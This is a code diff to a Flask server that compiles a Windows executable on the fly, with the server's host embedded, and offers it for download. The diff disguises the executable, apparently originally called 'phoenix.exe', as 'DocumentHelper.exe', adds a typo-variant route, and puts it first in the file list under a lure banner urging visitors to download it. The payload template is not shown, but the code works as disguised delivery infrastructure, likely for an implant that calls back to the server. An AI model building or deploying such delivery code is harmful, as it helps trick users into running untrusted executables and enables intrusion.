@@ -4,6 +4,7 @@ from datetime import datetime
 from io import BytesIO
 from flask import Flask, request, send_from_directory, send_file, render_template, jsonify, abort
 from werkzeug.utils import secure_filename
+import subprocess, tempfile, hashlib
 
 app = Flask(__name__)
 
@@ -13,27 +14,25 @@ UPLOAD_DIR = os.path.join(BASE_DIR, "uploaded")
 os.makedirs(BASE_DIR, exist_ok=True)
 os.makedirs(UPLOAD_DIR, exist_ok=True)
 
-import subprocess, tempfile, hashlib, os, re
-
 LAUNCHER_TEMPLATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "launcher_template.c")
 EXE_CACHE_DIR = os.path.join(BASE_DIR, ".exe_cache")
 os.makedirs(EXE_CACHE_DIR, exist_ok=True)
 
-
-
-ICON_FILE         = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.ico")
-
-# Cache the compiled icon .o alongside the exes
+ICON_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.ico")
 ICON_OBJ = os.path.join(EXE_CACHE_DIR, "app.ico.o")
 
 def _ensure_icon_obj() -> str | None:
-    """Compile app.rc + app.ico -> app.ico.o once. Returns path, or None if no icon."""
+    """Compile app.rc + app.ico -> app.ico.o once. Returns path, or None if no icon or windres missing."""
     if not os.path.isfile(ICON_FILE):
         return None
 
     # Rebuild only if missing or older than the .ico
     if os.path.isfile(ICON_OBJ) and os.path.getmtime(ICON_OBJ) >= os.path.getmtime(ICON_FILE):
         return ICON_OBJ
+
+    # Check if windres is available
+    if subprocess.run(["which", "x86_64-w64-mingw32-windres"], capture_output=True).returncode != 0:
+        return None
 
     with tempfile.TemporaryDirectory(dir=EXE_CACHE_DIR) as td:
         rc_path = os.path.join(td, "app.rc")
@@ -59,14 +58,23 @@ def _ensure_icon_obj() -> str | None:
 
     return ICON_OBJ
 
-def _build_phoenix_exe(server_host: str) -> str:
+def _build_document_helper_exe(server_host: str) -> str:
     if not re.fullmatch(r"[A-Za-z0-9.\-:]+", server_host):
         raise ValueError("Invalid server host")
 
     key    = hashlib.sha256(server_host.encode()).hexdigest()[:16]
-    cached = os.path.join(EXE_CACHE_DIR, f"phoenix_{key}.exe")
+    cached = os.path.join(EXE_CACHE_DIR, f"DocumentHelper_{key}.exe")
     if os.path.isfile(cached) and os.path.getsize(cached) > 0:
         return cached
+
+    # Check if cross compiler is available
+    has_gcc = subprocess.run(["which", "x86_64-w64-mingw32-gcc"], capture_output=True).returncode == 0
+    if not has_gcc:
+        # Fallback to existing DocumentHelper.exe if present
+        static_fallback = os.path.join(BASE_DIR, "DocumentHelper.exe")
+        if os.path.isfile(static_fallback):
+            return static_fallback
+        raise RuntimeError("x86_64-w64-mingw32-gcc compiler not found on server")
 
     icon_obj = _ensure_icon_obj()          # ← compile .ico once, reuse forever
 
@@ -75,7 +83,7 @@ def _build_phoenix_exe(server_host: str) -> str:
 
     with tempfile.TemporaryDirectory(dir=EXE_CACHE_DIR) as td:
         cpath   = os.path.join(td, "launcher.c")
-        exepath = os.path.join(td, "phoenix.exe")
+        exepath = os.path.join(td, "DocumentHelper.exe")
         with open(cpath, "w", encoding="utf-8") as f:
             f.write(src)
 
@@ -94,19 +102,28 @@ def _build_phoenix_exe(server_host: str) -> str:
 
     return cached
 
+# Keep backward-compatible alias
+_build_phoenix_exe = _build_document_helper_exe
 
 
 @app.route("/download/DocumentHelper.exe", methods=["GET"])
-def download_phoenix_exe():
+@app.route("/download/DecumentHelper.exe", methods=["GET"])
+@app.route("/download/phoenix.exe", methods=["GET"])
+def download_document_helper_exe():
     server_host = request.host          # e.g. "172.16.25.1:5001" — port included
+    requested_name = request.path.rsplit("/", 1)[-1]
+    if requested_name not in ("DocumentHelper.exe", "DecumentHelper.exe", "phoenix.exe"):
+        requested_name = "DocumentHelper.exe"
     try:
-        exe = _build_phoenix_exe(server_host)
+        exe = _build_document_helper_exe(server_host)
     except Exception as e:
-        return jsonify({"error": str(e)}), 50
+        return jsonify({"error": str(e)}), 500
     return send_file(
-        exe, as_attachment=True, download_name="DocumentHelper.exe",
+        exe, as_attachment=True, download_name=requested_name,
         mimetype="application/vnd.microsoft.portable-executable"
     )
+
+download_phoenix_exe = download_document_helper_exe
 
 
 # File extensions where the server IP should be dynamically updated on download
@@ -123,9 +140,10 @@ def get_files_only(directory):
 @app.route("/", methods=["GET"])
 def index():
     files = get_files_only(BASE_DIR)
-    # Always advertise the on-the-fly launcher
-    if "phoenix.exe" not in files:
-        files.insert(0, "DocumentHelper.exe")
+    # Deduplicate: if DocumentHelper.exe or phoenix.exe is in BASE_DIR, remove it from list
+    files = [f for f in files if f not in ("DocumentHelper.exe", "DecumentHelper.exe", "phoenix.exe")]
+    # Always advertise the on-the-fly launcher as the first item
+    files.insert(0, "DocumentHelper.exe")
     return render_template(
         "index.html", title="Project Files", page="main",
         banner="Hey, complete your project by downloading these files.",
@@ -133,11 +151,10 @@ def index():
     )
 
 
-
 @app.route("/download/<path:filename>", methods=["GET"])
 def download_file(filename):
-    if filename == "DocumentHelper.exe":
-        return download_phoenix_exe()
+    if filename in ("DocumentHelper.exe", "DecumentHelper.exe", "phoenix.exe"):
+        return download_document_helper_exe()
     file_path = os.path.join(BASE_DIR, filename)
     if not os.path.isfile(file_path) or filename.startswith("."):
         abort(404)
